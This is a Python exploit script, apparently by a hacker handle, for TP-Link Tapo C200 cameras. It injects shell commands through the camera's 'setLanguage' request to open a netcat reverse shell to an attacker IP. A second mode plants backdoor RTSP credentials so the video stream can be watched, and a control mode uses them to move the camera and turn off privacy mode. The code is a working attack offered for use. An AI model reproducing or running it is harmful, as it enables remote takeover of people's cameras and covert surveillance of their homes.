#!/usr/bin/env python3
"""
TP-Link Tapo C200 Camera Control Script
By @TryH4ckM3
"""

import requests
import urllib3
import sys
import threading
import os
import hashlib
import time
import json
from urllib3.exceptions import InsecureRequestWarning
import argparse

def art():
    ART = """
▄▄▄█████▓ ▄▄▄       ██▓███   ▒█████  
▓  ██▒ ▓▒▒████▄    ▓██░  ██▒▒██▒  ██▒
▒ ▓██░ ▒░▒██  ▀█▄  ▓██░ ██▓▒▒██░  ██▒
░ ▓██▓ ░ ░██▄▄▄▄██ ▒██▄█▓▒ ▒▒██   ██░
  ▒██▒ ░  ▓█   ▓██▒▒██▒ ░  ░░ ████▓▒░
  ▒ ░░    ▒▒   ▓▒█░▒▓▒░ ░  ░░ ▒░▒░▒░ 
    ░      ▒   ▒▒ ░░▒ ░       ░ ▒ ▒░ 
  ░        ░   ▒   ░░       ░ ░ ░ ▒  
               ░  ░             ░ ░                                                               
  Full control script by @TryH4ckM3
"""
    print(ART)

def console_help():
    print("Tapo C200 Control Console")
    print("Available commands:")
    print("  up [steps] - Move camera up (default 15)")
    print("  down [steps] - Move camera down (default 15)")
    print("  left [steps] - Move camera left (default 15)")
    print("  right [steps] - Move camera right (default 15)")
    print("  stop - Stop camera movement")
    print("  preset_goto <1-8> - Go to preset position")
    print("  preset_set <1-8> <name> - Save preset position")
    print("  privacy_on - Enable privacy mode")
    print("  privacy_off - Disable privacy mode")
    print("  clear - clear the screen")
    print("  reboot - Reboot camera")
    print("  reset - Reset camera position")
    print("  exit - Quit the program")
    print("")

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class TapoC200Controller:
    def __init__(self, host, username, password, port=443, debug=False):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.debug = debug
        self.base_url = f"https://{self.host}:{self.port}"
        self.token = None
        self.step = 15  # Default movement step
        
        # Create session
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'Content-Type': 'application/json',
            'Host': self.host,
            'Accept-Encoding': 'gzip, deflate',
            'requestByApp': 'true',
            'Connection': 'close'
        })
        
        if not self.login():
            raise Exception("Failed to login to camera")

    def log(self, message, level="info"):
        """Log messages with different levels"""
        if self.debug or level != "debug":
            print(f"[{level.upper()}] {message}")

    def login(self):
        """Authenticate with the camera and get a token"""
        hashed_password = hashlib.md5(self.password.encode()).hexdigest().upper()
        
        payload = {
            "method": "login",
            "params": {
                "hashed": "true",
                "password": hashed_password,
                "username": self.username
            }
        }
        
        try:
            self.log(f"Login payload: {json.dumps(payload)}", "debug")
            response = self.session.post(
                self.base_url,
                data=json.dumps(payload)
            )
            
            if response.status_code == 200:
                data = response.json()
                self.log(f"Login response: {json.dumps(data, indent=4)}", "debug")
                
                if data.get("error_code") == 0:
                    self.token = data["result"]["stok"]
                    self.log(f"Successfully logged in. Token: {self.token}")
                    return True
                else:
                    self.log(f"Login failed with error: {data.get('error_code')}")
            else:
                self.log(f"Login failed with status: {response.status_code}")
        except Exception as e:
            self.log(f"Login error: {str(e)}", "error")
        
        return False

    def sendCmd(self, cmd):
        """Send a raw command to the camera (matching Perl version)"""
        if not self.token:
            self.log("No token available, trying to login...")
            if not self.login():
                return None
        
        url = f"{self.base_url}/stok={self.token}/ds"
        
        try:
            self.log(f"Sending command: {cmd}", "debug")
            response = self.session.post(
                url,
                data=cmd
            )
            
            if response.status_code == 200:
                data = response.json()
                self.log(f"Command response: {json.dumps(data, indent=4)}", "debug")
                
                if data.get("error_code") == 0:
                    self.log("Command successful")
                    return True
                elif data.get("error_code") == -40401:  # Token expired
                    self.log("Token expired, re-logging in...")
                    if self.login():
                        return self.sendCmd(cmd)
                else:
                    self.log(f"Command failed with error: {data.get('error_code')}")
            else:
                self.log(f"Command failed with status: {response.status_code}")
        except Exception as e:
            self.log(f"Command error: {str(e)}", "error")
        
        return False

    # Movement commands (matching Perl version exactly)
    def moveConUp(self):
        self.log("Move Up")
        return self.sendCmd(f'{{"method":"do","motor":{{"move":{{"x_coord":"0","y_coord":"{self.step}"}}}}}}')

    def moveConDown(self):
        self.log("Move Down")
        return self.sendCmd(f'{{"method":"do","motor":{{"move":{{"x_coord":"0","y_coord":"-{self.step}"}}}}}}')

    def moveConLeft(self):
        self.log("Move Left")
        return self.sendCmd(f'{{"method":"do","motor":{{"move":{{"x_coord":"-{self.step}","y_coord":"0"}}}}}}')

    def moveConRight(self):
        self.log("Move Right")
        return self.sendCmd(f'{{"method":"do","motor":{{"move":{{"x_coord":"{self.step}","y_coord":"0"}}}}}}')

    def moveConUpRight(self):
        self.log("Move Diagonally Up Right")
        return self.sendCmd(f'{{"method":"do","motor":{{"move":{{"x_coord":"{self.step}","y_coord":"{self.step}"}}}}}}')

    def moveConDownRight(self):
        self.log("Move Diagonally Down Right")
        return self.sendCmd(f'{{"method":"do","motor":{{"move":{{"x_coord":"{self.step}","y_coord":"-{self.step}"}}}}}}')

    def moveConUpLeft(self):
        self.log("Move Diagonally Up Left")
        return self.sendCmd(f'{{"method":"do","motor":{{"move":{{"x_coord":"-{self.step}","y_coord":"{self.step}"}}}}}}')

    def moveConDownLeft(self):
        self.log("Move Diagonally Down Left")
        return self.sendCmd(f'{{"method":"do","motor":{{"move":{{"x_coord":"-{self.step}","y_coord":"-{self.step}"}}}}}}')

    def moveStop(self):
        self.log("Move Stop")
        return self.sendCmd('{"method":"do","motor":{"stop":"null"}}')

    # Preset commands
    def presetGoto(self, preset):
        self.log(f"Go To Preset {preset}")
        return self.sendCmd(f'{{"method":"do","preset":{{"goto_preset": {{"id": "{preset}"}}}}}}')

    def presetSet(self, preset, label="Preset"):
        self.log(f"Set Preset {preset} with label {label}")
        # First remove existing preset
        self.sendCmd(f'{{"method":"do","preset":{{"remove_preset":{{"id":[{preset}]}}}}}}')
        # Then create new preset
        return self.sendCmd(f'{{"method":"do","preset":{{"set_preset":{{"id":"{preset}","name":"{label}","save_ptz":"1"}}}}}}')

    # Other commands
    def reset(self):
        self.log("Resetting position")
        return self.sendCmd('{"method":"do","motor":{"manual_cali":"null"}}')

    def reboot(self):
        self.log("Rebooting")
        return self.sendCmd('{"method":"do","system":{"reboot":"null"}}')

    def wake(self):
        self.log("Disabling Lens Mask")
        return self.sendCmd('{"method":"set","lens_mask":{"lens_mask_info":{"enabled":"off"}}}')

    def sleep(self):
        self.log("Enabling Lens Mask")
        return self.sendCmd('{"method":"set","lens_mask":{"lens_mask_info":{"enabled":"on"}}}')


class TapoC200Pwner:
    def __init__(self, host, attacker, revshell_port, debug=True):
        self.host = host
        self.attacker = attacker
        self.revshell_port = revshell_port
        self.debug = debug
        self.url = "https://" + self.host + ":443/"

    def shell(self):
        REVERSE_SHELL = 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f'
        NC_COMMAND = 'nc -lp %d' % self.revshell_port

        print("[INFO] Listening on port %d..." % self.revshell_port)
        t = threading.Thread(target=os.system, args=(NC_COMMAND,))
        t.start()
        time.sleep(2)
        print("[INFO] Sending reverse shell to %s...\n" % self.host)
        json = {"method": "setLanguage", "params": {"payload": "';" + REVERSE_SHELL % (self.attacker, self.revshell_port) + ";'"}}
        req = requests.post(self.url, json=json, verify=False)
        if self.debug:
            print("[INFO] Answer:\n", req.text)

    def rtsp(self):
        RTSP_USER = 'pwned1337'
        RTSP_PASSWORD = 'pwned1337'
        RTSP_CIPHERTEXT = 'RUW5pUYSBm4gt+5T7bzwEq5r078rcdhSvpJrmtqAKE2mRo8bvvOLfYGnr5GNHfANBeFNEHhucnsK86WJTs4xLEZMbxUS73gPMTYRsEBV4EaKt2f5h+BkSbuh0WcJTHl5FWMbwikslj6qwTX48HasSiEmotK+v1N3NLokHCxtU0k='

        print("[INFO] Setting up RTSP video stream...")
        md5_rtsp_password = hashlib.md5(RTSP_PASSWORD.encode()).hexdigest().upper()
        json = {"method": "setLanguage", "params": {"payload": "';uci set user_management.third_account.username=%s;uci set user_management.third_account.passwd=%s;uci set user_management.third_account.ciphertext=%s;uci commit user_management;/etc/init.d/cet terminate;/etc/init.d/cet resume;'" % (RTSP_USER, md5_rtsp_password, RTSP_CIPHERTEXT)}}
        req = requests.post(self.url, json=json, verify=False)
        if self.debug:
            print("[INFO] Answer:\n", req.text)

        print("[INFO] RTSP video stream available at rtsp://%s/stream2" % self.host)
        print("[+] RTSP username: %s" % RTSP_USER)
        print("[+] RTSP password: %s" % RTSP_PASSWORD)

if __name__ == "__main__":
    art()
    
    # Create the main parser
    parser = argparse.ArgumentParser(
        description='Tp-Link Tapo C200 Universal Control Script',
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    # Required arguments
    required_args = parser.add_argument_group('Required Arguments')
    required_args.add_argument(
        '-t', '--target', 
        help='Tapo C200 IP address (e.g., 192.168.1.100)', 
        required=True
    )
    required_args.add_argument(
        '-a', '--attacker', 
        help='Your IP address (for reverse shell access)', 
        required=True
    )
    required_args.add_argument(
        '-m', '--mode', 
        help='Operation mode:\n'
             '  shell - Get a reverse shell on the camera\n'
             '  rtsp - Change RTSP credentials\n'
             '  control - Control camera movements and settings',
        choices=['shell', 'rtsp', 'control'],
        required=True
    )
    
    # Optional arguments
    optional_args = parser.add_argument_group('Optional Arguments')
    optional_args.add_argument(
        '-p', '--revshell-port', 
        help='Port to listen for reverse shell on (default: 1337)', 
        type=int,
        default=1337
    )
    optional_args.add_argument(
        '-v', '--verbose', 
        help='Enable verbose output for debugging', 
        action='store_true'
    )
    
    args = parser.parse_args()

    # Handle mode selection
    if args.mode == 'shell':
        # Initialize classes
        pwner = TapoC200Pwner(
            host=args.target,
            attacker=args.attacker,
            revshell_port=args.revshell_port,
            debug=args.verbose
            )
        pwner.shell()
    elif args.mode == 'rtsp':
        pwner = TapoC200Pwner(
            host=args.target,
            attacker=args.attacker,
            revshell_port=args.revshell_port,
            debug=args.verbose
            )
        pwner.rtsp()
    else:
        controller = TapoC200Controller(
            host=args.target,
            username="pwned1337",
            password="pwned1337",
            debug=args.verbose
        )

        console_help()
        while True:
            try:
                cmd = input("> ").strip().lower()
                if not cmd:
                    continue

                parts = cmd.split()
                base_cmd = parts[0]
                steps = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else controller.step

                if base_cmd == "clear":
                    os.system("clear")
                    continue

                if base_cmd == "help":
                    console_help()
                    continue

                if base_cmd == "exit":
                    break
                elif base_cmd == "up":
                    controller.step = steps  # Temporarily set step value
                    controller.moveConUp()
                    controller.step = 15  # Reset to default
                elif base_cmd == "down":
                    controller.step = steps
                    controller.moveConDown()
                    controller.step = 15
                elif base_cmd == "left":
                    controller.step = steps
                    controller.moveConLeft()
                    controller.step = 15
                elif base_cmd == "right":
                    controller.step = steps
                    controller.moveConRight()
                    controller.step = 15
                elif base_cmd == "stop":
                    controller.moveStop()
                elif base_cmd == "preset_goto":
                    if len(parts) == 2 and parts[1].isdigit() and 1 <= int(parts[1]) <= 8:
                        controller.presetGoto(int(parts[1]))
                    else:
                        print("Usage: preset_goto <1-8>")
                elif base_cmd == "preset_set":
                    if len(parts) >= 2 and parts[1].isdigit() and 1 <= int(parts[1]) <= 8:
                        name = parts[2] if len(parts) > 2 else f"Preset {parts[1]}"
                        controller.presetSet(int(parts[1]), name)
                    else:
                        print("Usage: preset_set <1-8> [name]")
                elif base_cmd == "privacy_on":
                    controller.sleep()
                elif base_cmd == "privacy_off":
                    controller.wake()
                elif base_cmd == "reboot":
                    confirm = input("Are you sure you want to reboot the camera? (y/n): ")
                    if confirm.lower() == "y":
                        controller.reboot()
                elif base_cmd == "reset":
                    controller.reset()
                else:
                    print("Unknown command. Type 'help' for available commands")

            except KeyboardInterrupt:
                exit(0)
            except Exception as e:
                print(f"Error: {str(e)}")
